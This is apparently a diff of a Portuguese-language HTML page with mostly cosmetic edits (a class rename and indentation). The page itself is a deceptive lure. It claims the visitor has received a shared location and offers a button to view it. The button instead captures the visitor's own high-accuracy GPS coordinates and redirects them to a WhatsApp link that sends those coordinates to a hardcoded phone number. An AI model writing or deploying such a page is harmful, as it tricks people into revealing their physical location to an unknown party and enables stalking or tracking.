@@ -15,7 +15,7 @@
             margin: 0;
         }
 
-        .card {
+        .container {
             background: #fff;
             border-radius: 12px;
             padding: 30px 25px;
@@ -60,7 +60,6 @@
                         let latitude = position.coords.latitude;
                         let longitude = position.coords.longitude;
                         let linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
                         let whatsapp = `https://wa.me/558193568037?text=Minha localização: ${linkMaps}`;
                         window.location.href = whatsapp;
                     },
@@ -68,8 +67,8 @@
                         alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
                     },
                     {
-                        enableHighAccuracy: true, 
-                        timeout: 10000, 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
                         maximumAge: 0
                     }
                 );
@@ -81,9 +80,9 @@
 </head>
 <body>
     <div class="container">
-    <h2>📍Acessar Localização Compartilhada</h2>
-    <p>Você recebeu um link de localização. Clique abaixo para visualizar a posição exata no mapa em tempo real.</p>
-    <button class="btn" onclick="enviarLocalizacao()">Ver Localização</button>
-</div>
+        <h2>📍Acessar Localização Compartilhada</h2>
+        <p>Você recebeu um link de localização. Clique abaixo para visualizar a posição exata no mapa em tempo real.</p>
+        <button class="btn" onclick="enviarLocalizacao()">Ver Localização</button>
+    </div>
 </body>
 </html>
